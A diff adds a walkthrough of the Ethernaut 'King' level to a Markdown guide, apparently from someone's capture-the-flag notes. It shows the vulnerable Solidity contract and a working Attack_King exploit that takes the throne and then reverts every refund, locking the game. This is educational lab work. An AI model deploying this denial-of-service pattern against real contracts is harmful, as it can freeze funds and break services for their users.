@@ -7,7 +7,7 @@
 6. [Delegation](#6-delegation)
 7. [Force](#7-force)
 8. [Vault](#8-vault)
-9. [King]
+9. [King](#9-king)
 10. [Re-entrancy]
 11. [Elevator]
 12. [Privacy]
@@ -467,3 +467,66 @@ Now the `locked` variable should be `false`.
 ##### Takeaway from Ethernaut
 It's important to remember that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.\
 To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will be visible to anyone looking for it. zk-SNARKs provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter.
+
+# 9. King
+### Challenge
+- Make the contract no longer able to change king.
+### Purpose
+Understanding the misusage of ether transfer.
+### Contract
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract King {
+
+  address king;
+  uint public prize;
+  address public owner;
+
+  constructor() payable {
+    owner = msg.sender;  
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  receive() external payable {
+    require(msg.value >= prize || msg.sender == owner);
+    payable(king).transfer(msg.value);
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  function _king() public view returns (address) {
+    return king;
+  }
+}
+```
+### Solution
+##### Explanation
+It is possible that the calling address can be a contract. `King` function does use any patter to avoid it from being victim of DOS attack. If we create a contract with ether equivalent of `prize` and send the same to `King`, it will become new king. Then all we need is a payable fallback function that reverts whenever triggered since `King` will transfer the amount to this contract whenever someone tries to become new king.
+##### Exploit
+```
+contract Attack_King {
+  address public targetContractAddress;
+
+  constructor(address _targetContractAddress) payable {
+    targetContractAddress = _targetContractAddress;
+    (bool success,) = targetContractAddress.call{value: address(this).balance}("");
+    require(success, "call failed");
+  }
+
+  fallback() external payable {
+    revert();
+  }
+
+  receive() external payable {
+    revert();
+  }
+}
+```
+1. Deploy above contract with `king` contract address as constructor argument.\
+And we are done. It can no longer change the king despite the value of ether sent.
+##### Takeaway from Ethernaut
+Most of Ethernaut's levels try to expose (in an oversimplified form of course) something that actually happened — a real hack or a real bug.\
+In this case, see: [King of the Ether](https://www.kingoftheether.com/thrones/kingoftheether/index.html) and [King of the Ether Postmortem](http://www.kingoftheether.com/postmortem.html).
